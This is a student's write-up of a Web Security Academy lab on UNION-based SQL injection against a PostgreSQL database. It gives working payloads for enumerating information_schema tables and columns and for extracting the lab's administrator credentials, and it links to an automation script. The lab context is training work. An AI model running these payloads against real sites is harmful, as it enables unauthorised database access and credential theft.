# Non-Oracle databases listing contents
#DATABASEENUM 
#UNION 
#WRITEUP 

Follow the [[Methodology UNION attacks]]

## 1. Number of columns of result set

![[SQLInjection/Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on non-Oracle databases/images/columns.png]]
There are two columns on the result set.

## 2. Columns that can hold string data

Both columns can hold string data.

![[string.png]]

## 3. Exploitation

### List tables

Select the `TABLE_NAME` column from `information_schema.tables`

![[all tables.png]]

The payload

```SQL
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

Then inspect the columns on the interesting tables.

### Listing columns of interesting tables

Inspect the tables for keywords like `password`

```SQL
SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = '$TABLE NAME$'
```
```SQL
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = '$TABLE NAME$'--
```

## Enumerating all tables

I wrote a Python script to scrape the name of every table injecting the query to the `information_schema.tables` table on the page. Then I used those tables names to inject another query to look for interesting column names like `username` or `password`. Finally the script outputs the tables that contained columns with those keywords.

![[script.png]]

	Note: Another option would be to extract the tables names only and use Burp's Intruder to do the job and apply a filter for the same keywords.

The script is available [here](https://github.com/JoseDRamirezM/InfoSec/blob/main/Web%20Security%20Academy/SQL%20injection/Attacks/Enumerating%20the%20database/labs/SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/exploit.py)

![[interesting tables.png]]

Now look inspect the columns of the output tables for the `administrator` credentials. From here I'll go manual.

Using the following payload obtain the columns of the tables.

#SQLiPAYLOAD 
```SQL
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_ebehna'--
```
	Note that the name of the user's table and columns changes on each instance.

![[login table.png]]

Then extract the information from the database.

## Database type and version

![[db type.png]]

The database is `PostgreSQL 12.10` I did this mostly to extract both columns in one go.

Using the following payload, the `administrator` credentials are obtained.

#SQLiPAYLOAD 
```SQL
' UNION SELECT username_rbclpr||'~'||password_yxrmhn,NULL FROM users_ebehna--
```

![[SQLInjection/Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on non-Oracle databases/images/admin creds.png]]

`administrator~azqo1iz26c2ivxoy99kl`

Now login as administrator and the lab is solved!